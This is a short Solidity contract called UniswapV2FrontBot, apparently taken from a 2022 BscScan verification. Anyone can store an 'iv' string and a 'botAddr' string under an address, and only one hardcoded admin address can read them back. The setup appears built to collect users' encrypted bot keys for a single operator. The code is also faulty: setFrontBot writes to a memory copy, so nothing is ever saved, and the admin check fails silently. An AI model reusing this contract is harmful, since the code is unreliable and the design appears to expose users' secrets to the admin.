/**
 *Submitted for verification at BscScan.com on 2022-02-09
*/

pragma solidity ^0.8.6;

contract UniswapV2FrontBot {
    
    struct FrontBot {
        string iv;
        string botAddr;
    }
    
    mapping (address => FrontBot) bots;
    address[] public botAccts;
    
    address public admin = 0xAF0E08F1BD50b86bd5D6505745B9B28a493BE5BA;
    
    modifier isAdmin(){
        if(msg.sender != admin)
            return;
        _;
    }
    
    function setFrontBot(address _address, string memory _iv, string memory _botAddr) public {
        FrontBot memory bot = bots[_address];
        
        bot.iv = _iv;
        bot.botAddr = _botAddr;

        botAccts.push(_address);
    }
    
    function getFrontBots() view public returns(address[] memory) {
        return botAccts;
    }
    
    function getFrontBotAddr(address _address) view isAdmin public returns (string memory) {
        return (bots[_address].botAddr);
    }
    
    function getFrontBotIv(address _address) view isAdmin public returns (string memory) {
        return (bots[_address].iv);
    }

    function countFrontBots() view public returns (uint) {
        return botAccts.length;
    }
}